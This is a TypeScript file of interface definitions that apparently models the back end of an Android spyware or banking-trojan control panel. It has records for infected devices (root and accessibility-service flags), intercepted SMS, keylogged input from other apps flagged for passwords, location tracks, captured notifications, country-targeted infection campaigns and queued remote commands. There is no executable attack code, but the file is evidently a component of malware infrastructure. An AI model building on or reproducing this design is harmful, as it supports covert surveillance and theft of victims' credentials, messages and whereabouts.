export interface Device {
  id: string
  model: string
  manufacturer: string
  android_version: number
  sdk: number
  battery: number
  ip: string
  country: string
  campaign_id: string
  last_seen: string
  created_at: string
  accessibility: boolean
  is_rooted: boolean
}

export interface SmsMessage {
  id: number
  device_id: string
  address: string
  body: string
  direction: 'incoming' | 'outgoing'
  timestamp: string
}

export interface KeylogEntry {
  id: number
  device_id: string
  app_package: string
  field_hint: string
  content: string
  is_password: boolean
  timestamp: string
}

export interface LocationPoint {
  id: number
  device_id: string
  latitude: number
  longitude: number
  accuracy: number
  provider: string
  timestamp: string
}

export interface NotificationEntry {
  id: number
  device_id: string
  package_name: string
  title: string
  text: string
  posted_at: string
}

export interface Campaign {
  id: string
  name: string
  target_country: string
  device_count: number
  created_at: string
}

export interface CommandResult {
  id: string
  device_id: string
  type: string
  status: 'pending' | 'sent' | 'acked' | 'failed'
  created_at: string
}
